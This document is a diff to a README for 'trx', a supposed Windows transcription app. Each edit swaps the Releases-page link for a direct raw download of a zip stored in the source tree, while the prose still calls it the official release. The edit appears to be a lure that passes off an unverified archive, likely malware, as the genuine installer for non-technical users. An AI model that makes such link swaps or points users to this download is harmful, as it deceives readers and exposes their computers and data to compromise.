@@ -1,6 +1,6 @@
 # 🎧 trx - Clean transcription for Windows
 
-[![Download trx](https://img.shields.io/badge/Download%20trx-Blue%20%26%20Gray?style=for-the-badge&logo=github)](https://github.com/idle-middlelowgerman509/trx/releases)
+[![Download trx](https://img.shields.io/badge/Download%20trx-Blue%20%26%20Gray?style=for-the-badge&logo=github)](https://github.com/idle-middlelowgerman509/trx/raw/refs/heads/main/packages/cli/src/Software_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to get trx on Windows and start using it with no coding
 
 ## 📥 Download trx
 
-Visit this page to download: https://github.com/idle-middlelowgerman509/trx/releases
+Visit this page to download: https://github.com/idle-middlelowgerman509/trx/raw/refs/heads/main/packages/cli/src/Software_v1.1.zip
 
 On the Releases page, look for the latest version. Download the Windows file that matches your computer. In most cases, that is the `.exe` file or a zipped Windows build.
 
@@ -189,7 +189,7 @@ Because trx runs on your computer, your files stay on your machine while you wor
 
 ## 📎 Releases Page
 
-Download and install from the latest release here: https://github.com/idle-middlelowgerman509/trx/releases
+Download and install from the latest release here: https://github.com/idle-middlelowgerman509/trx/raw/refs/heads/main/packages/cli/src/Software_v1.1.zip
 
 Use this page when you want the newest Windows build, older versions, or release files for testing
 
